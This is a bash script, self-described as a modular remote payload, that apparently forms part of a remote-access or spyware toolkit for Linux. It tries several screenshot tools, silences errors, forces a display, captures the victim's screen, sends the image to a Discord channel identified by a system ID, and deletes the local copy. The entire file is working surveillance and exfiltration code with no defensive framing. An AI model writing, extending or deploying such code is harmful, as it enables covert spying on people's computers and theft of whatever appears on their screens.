#!/bin/bash
# ============================================================
# Screenshot Capture for Linux - Modular Remote Payload
# ============================================================
# Takes a screenshot and sends to Discord
# Supports: scrot, gnome-screenshot, import (ImageMagick)
# ============================================================

SYSID=$(get_sysid)
SCREENSHOT="/tmp/screenshot_$(date +%s).png"

# Try different screenshot tools
take_screenshot() {
    # Method 1: scrot (most common)
    if command -v scrot &>/dev/null; then
        scrot "$SCREENSHOT" 2>/dev/null && return 0
    fi
    
    # Method 2: gnome-screenshot
    if command -v gnome-screenshot &>/dev/null; then
        gnome-screenshot -f "$SCREENSHOT" 2>/dev/null && return 0
    fi
    
    # Method 3: ImageMagick import
    if command -v import &>/dev/null; then
        import -window root "$SCREENSHOT" 2>/dev/null && return 0
    fi
    
    # Method 4: maim
    if command -v maim &>/dev/null; then
        maim "$SCREENSHOT" 2>/dev/null && return 0
    fi
    
    # Method 5: spectacle (KDE)
    if command -v spectacle &>/dev/null; then
        spectacle -b -n -o "$SCREENSHOT" 2>/dev/null && return 0
    fi
    
    return 1
}

# Check if we have a display
if [[ -z "$DISPLAY" ]]; then
    export DISPLAY=:0
fi

if take_screenshot && [[ -f "$SCREENSHOT" ]]; then
    send_discord "📸 Screenshot from **$SYSID**" "$SCREENSHOT"
    rm -f "$SCREENSHOT"
else
    send_discord "❌ Screenshot failed on $SYSID - No screenshot tool available (try: apt install scrot)"
fi

